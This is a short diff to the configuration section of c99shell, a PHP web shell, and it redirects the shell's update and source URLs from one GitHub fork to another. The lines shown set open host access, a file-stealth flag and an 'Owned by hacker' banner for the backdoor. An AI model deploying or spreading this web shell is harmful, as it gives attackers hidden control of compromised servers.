@@ -120,11 +120,11 @@ $host_allow = array(
     "*"
 );
 $login_txt = "Restricted area";
-$accessdeniedmess = "<a href=\"https://github.com/KaizenLouie/C99Shell-PHP7\">c99shell v." . $shver . "</a>: access denied";
+$accessdeniedmess = "<a href=\"https://github.com/trhacknon/C99Shell-PHP7\">c99shell v." . $shver . "</a>: access denied";
 $gzipencode = true;
 $updatenow = false;
-$c99sh_updateurl = "https://github.com/KaizenLouie/C99Shell-PHP7/";
-$c99sh_sourcesurl = "https://github.com/KaizenLouie/C99Shell-PHP7/";
+$c99sh_updateurl = "https://github.com/trhacknon/C99Shell-PHP7/";
+$c99sh_sourcesurl = "https://github.com/trhacknon/C99Shell-PHP7/";
 $filestealth = true;
 $donated_html = "<center><b>Owned by hacker</b></center>";
 $donated_act = array(
